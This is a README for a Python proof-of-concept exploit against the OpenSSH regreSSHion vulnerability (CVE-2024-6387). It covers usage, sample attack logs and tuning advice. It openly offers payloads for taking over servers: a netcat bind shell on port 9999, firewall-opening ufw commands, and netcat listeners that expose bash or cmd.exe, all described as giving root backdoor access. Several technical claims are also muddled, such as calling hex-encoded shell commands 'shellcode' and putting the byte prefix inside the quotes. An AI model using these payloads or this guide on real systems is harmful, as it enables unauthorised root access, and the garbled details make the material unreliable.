# CVE-2024-6387
*Proof of concept python script for regreSSHion exploit. Version 0.1.0*
![regreSSHion-1024x576](https://github.com/user-attachments/assets/99cec864-b32d-409a-8fc4-1f9615686024)
# Usage
```
ðŸ”’ CVE-2024-6387 regreSSHion remote code execution vulnerability exploit script

usage: regreSSHion.py [-h] -i IP -p PORT [-s SHELLCODE] [-d] [-z]

ðŸ”’ CVE-2024-6387 regreSSHion remote code execution vulnerability exploit script

options:
  -h, --help                           show this help message and exit
  -i IP, --ip IP                       target SSH server IPv4 addr - 172.0.0.1 (format: -i 0.0.0.0)
  -p PORT, --port PORT                 target SSH server port nmbr - mostly 22 (format: -p 00)
  -s SHELLCODE, --shellcode SHELLCODE  shellcode payload in hex - add byte (b) (format: -s b"\x00\x00\x00")
  -d, --debug                          enable debug mode - more verbose output (format: -d)
  -z, --hack                           enable hack mode skipping SSH handshake (format: -z)

ðŸ”’

ðŸ”’ Affected OpenSSH Versions: 1.2.2p1 ~ 4.4 and 8.5p1 ~ 9.8

ðŸ”’ contact: github.com/l-urk - x.com/l_urkk
```
To use the script, start python3 with regreSSHion.py
-  Set the ip to the vulnerable ssh server (host not client), and port to 22 (almost always 22).
```
python3 regreSSHion.py --ip 127.0.0.1 --port 22
```
Example output:
```
2024-08-03 22:42:55,944 - INFOS - Attempting to connect to 127.0.0.1:22 (attempt 1)
2024-08-03 22:42:55,945 - INFOS - Connection established
2024-08-03 22:42:55,945 - INFOS - Performing SSH handshake...
2024-08-03 22:43:05,014 - INFOS - Received KEX_INIT (5 bytes)
2024-08-03 22:43:05,015 - INFOS - SSH handshake successful.
2024-08-03 22:43:05,015 - INFOS - Preparing heap...
2024-08-03 22:43:05,015 - INFOS - Sent tcache chunk 1
2024-08-03 22:43:05,015 - INFOS - Sent tcache chunk 2
2024-08-03 22:43:05,015 - INFOS - Sent tcache chunk 3
2024-08-03 22:43:05,015 - INFOS - Sent tcache chunk 4
```
Let's say you make it all the way here in the script...
```
2024-08-03 22:46:45,858 - INFOS - Sent fake file structure 3
2024-08-03 22:46:45,858 - INFOS - Sent fake file structure 4
2024-08-03 22:46:45,858 - INFOS - Sent fake file structure 5
2024-08-03 22:46:45,858 - INFOS - Sent large string
2024-08-03 22:46:45,858 - INFOS - Heap preparation complete.
2024-08-03 22:47:05,879 - INFOS - Estimated parsing time: 0.000056 seconds
2024-08-03 22:47:05,880 - INFOS - Final packet sent successfully.
2024-08-03 22:47:05,880 - INFOS - Verifying exploit success.
2024-08-03 22:47:15,890 - WARN! - No response received for verification.
2024-08-03 22:47:15,891 - ERROR - Exploitation failed.
```
If it says exploit verification success. You have successfully delivered and executed your payload.
The script will try a few times to succeed. I would suggest trying this on your own vulnerable SSH server until you get a feel for getting the success message.

Debug mode
-  With debug mode enabled you will get a more verbose output, this will show you the received SSH version string, packet length information, and some other things, pretty much everything that's happening that could possibly be logged.
```
python3 regreSSHion.py --ip 127.0.0.1 --port 22 --debug
```
Example Output:
```
2024-08-03 22:44:53,962 - DEBUG - Logging is set to DEBUG level
2024-08-03 22:44:53,962 - INFOS - Attempting to connect to 127.0.0.1:22 (attempt 1)
2024-08-03 22:44:53,963 - INFOS - Connection established
2024-08-03 22:44:53,963 - INFOS - Performing SSH handshake...
2024-08-03 22:44:53,963 - DEBUG - Sent SSH version string.
2024-08-03 22:44:53,963 - DEBUG - Waiting to receive SSH version string
2024-08-03 22:45:03,256 - DEBUG - Received SSH version string: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
2024-08-03 22:45:04,373 - INFOS - Received KEX_INIT (4 bytes)
2024-08-03 22:45:04,373 - INFOS - SSH handshake successful.
2024-08-03 22:45:04,373 - INFOS - Preparing heap...
```

# Editing regreSSHion.py
-  I use kali linux in WSL, but you might use something else, like a debian linux distro. Either way, here's how to edit it, and what to edit.

**using nano**
```
nano regreSSHion.py
```
**using vim**
```
vim regreSSHion.py
```
Things you might want to edit...

**CONNECTION_RETRIES =** (line 26): 
-  Increasing this will increase your retry connections, so if the exploit fails due to timing, it will retry this number of times. Official documentation (https://www.openssh.com/releasenotes.html#9.8p1) states: "Under lab conditions, the attack requires on
average 6-8 hours of continuous connections up to the maximum the server will accept."
-  I'm pretty sure it either just takes getting lucky, or a very specific packet injection technique to pull it off. 
-  You can finetune everything and see if it works, I would appreacite feedback so please open a discussion or issues tab if you have success or want help during your resaerch of this exploit.
```
CONNECTION_RETRIES = 5
```
-  Replace 5 with the number of retries want, for example, 100.
```
CONNECTION_RETRIES = 100
```

**shellcode =** (line 32):
-  Changing this is the whole reason you're running the exploit to begin with. Effectively you're tricking the SSH host (server) into giving you root access for a few seconds, allowing you to give it an arbitrary command. Here's an example of a useless command that you would never want to give it:
```
#this shellcode prints hello world
shellcode = b"\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
-  This would print "hello world" for nobody to see inside the socket based regreSSHion.py and vulnerable OpenSSH host (server).
-  *What you really want is a command that you can either test for to make sure it actually ran (like making a file called "test", wherever the home directory is for the SSH host), or sending you a webhook for proof of success, or opening a reverse shell (this will cause the connection to last more than a few seconds and give you backdoor access as long as the port is open).*
-  For the reverse shell I use default netcat (nc) which will listen on port 9999, and lock in a sh shell upon connection. This could also be a usr/bin/bash shell if you want.

**The next three sections show what an effective shellcode payload could be and how to create one.**
# Shellcode Payload Testing Examples
To change the payload, edit the shellcode hex on line 32 (large, imperminant payloads) - or use the -s flag (small payloads)

-  hello world
```
hello world
```
```
"\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
**Print hello world in the shell:**

-  hello world using printf:
```
printf hello world
```
```
"\x70\x72\x69\x6E\x74\x66\x20\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
-  hello world using echo:
```
echo hello world
```
```
"\x65\x63\x68\x6F\x20\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```

-  makes a file called "test" containing only the word "test":
```
test > test
```
```
"\x74\x65\x73\x74\x20\x3E\x20\x74\x65\x73\x74"
```
# Shellcode Payload Actual Usecase Examples
-  open a nc shell on port 9999: 
```
/usr/bin/nc -lvp 9999 -e /usr/bin/sh
```
```
"\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x6E\x63\x20\x2D\x6C\x76\x70\x20\x39\x39\x39\x39\x20\x2D\x65\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x73\x68"
```
-  allow incoming connections on port 9999 WITHOUT sudo:
```
ufw allow 9999
```
```
"\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39"
```
-  allow incoming connections on port 9999 WITH sudo:
```
sudo ufw allow 9999
```
```
"\x73\x75\x64\x6F\x20\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39"
```
-  allow connections on port 9999 & open a nc shell on port 9999 WITHOUT sudo:
```
ufw allow 9999 && /usr/bin/nc -lvp 9999 -e /usr/bin/sh
```
```
"\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39\x20\x26\x26\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x6E\x63\x20\x2D\x6C\x76\x70\x20\x39\x39\x39\x39\x20\x2D\x65\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x73\x68"
```
-  allow connections (port 9999) & open a nc shell on port 9999 WITH sudo:
```
sudo ufw allow 9999 && /usr/bin/nc -lvp 9999 -e /usr/bin/sh
```
```
"\x73\x75\x64\x6F\x20\x75\x66\x77\x20\x61\x6C\x6C\x6F\x77\x20\x39\x39\x39\x39\x20\x26\x26\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x6E\x63\x20\x2D\x6C\x76\x70\x20\x39\x39\x39\x39\x20\x2D\x65\x20\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x73\x68"
```
-  *Since we're getting a root shell connection with this exploit, sudo is not nessesary and may actually cause the exploit to fail depending on how the server is set up to handle sudo, in that it may prompt for a password despite our connection being root by default, so I would suggest to only use the payloads with sudo during your testing of the script, or if you feel that it is nessesary, such as if you can gain a connection that is by default linked to a userprofile and the password for sudoing is blank.*

# Shellcode Creation
You can make your own shellcode payload by using an ascii to hex editor, and manually concerting it to shellcode. I use this ascii-to-hex website here:
```
https://www.rapidtables.com/convert/number/ascii-to-hex.html
```
# **1.** Input your desired text for the shellcode. 
- Use the settings "User defined" and "\x" in the input box.

![image](https://github.com/user-attachments/assets/397efbe4-00f4-41d6-85e6-65135949fdf6)
# **2.** Manually replace all capital X's to lowecase x's
- Use notepad or another character replacement capable program.
- Run command for efficiency... Will overwrite hexcode.txt on the desktop.
- Replace YOUR_NEW_HEXCODE with actual new hexcode.
```
cmd.exe /c cd "UserProfileE%\Desktop" && echo YOUR_NEW_HEXCODE > hexcode.txt && notepad.exe "UserProfileE%\Desktop\hexcode.txt"
```
![image](https://github.com/user-attachments/assets/982facb9-85de-4cbe-a6f3-0e17f9f74f7d)

# **3.** Move the last \x from the end to the start of the hex string.

![image](https://github.com/user-attachments/assets/fdf6c626-baa4-46b2-956b-deda1aefe443)

# **4.** Add quotes to both ends for interpretation by the shell.

![image](https://github.com/user-attachments/assets/916fa406-ee62-4237-b8fb-c2c361d11c31)

# **5.** Python byte interpretation socket sending

**Without byte specification:**
```
"\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```
- To have the program automatically conver the shellcode to type - bytes - add a "b" as the first character.

**With byte specification:**
```
"b\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64"
```

This is so the program knows to convert the shellcode to bytes during the transfer.

You have to manually edit the file to paste in your shellcode.

# send_socket.py
If you want to test out the exection of a shellcode payload you can use the send_socket.py script. 

Usage:
```
usage: send_socket.py [-h] [-i IP] [-p PORT] [-shellcode SHELLCODE]

send shellcode to a target IP and port

options:
  -h, --help            show this help message and exit
  -i IP, --ip IP        target ip address (default: 127.0.0.1)
  -p PORT, --port PORT  target tcp socket port (default: 1111)
  -shellcode SHELLCODE  shellcode hex to send in format: \x00\x00\x00\...etc (default: printf hello world)
```
![image](https://github.com/user-attachments/assets/c4f0454f-f1c8-4002-a7b6-bfab3b22d05d)


With custom shellcode:
```
python3 send_socket.py -i 127.0.0.1 -p 22
```
**Listener:**

Netcat linux listener:
```
nc -lvvkp 1111
```
Netcat linux listener shell:
```
nc -lvvkp 1111 -e /usr/bin/bash
```
Netcat Windows listener:
```
ncat -lvvvvvvkp 1111"
```
Netcat Windows listener shell:
```
ncat -lvvvvvvkp 1111 -e "%SYSTEMDRIVE%\Windows\System32\cmd.exe"
```
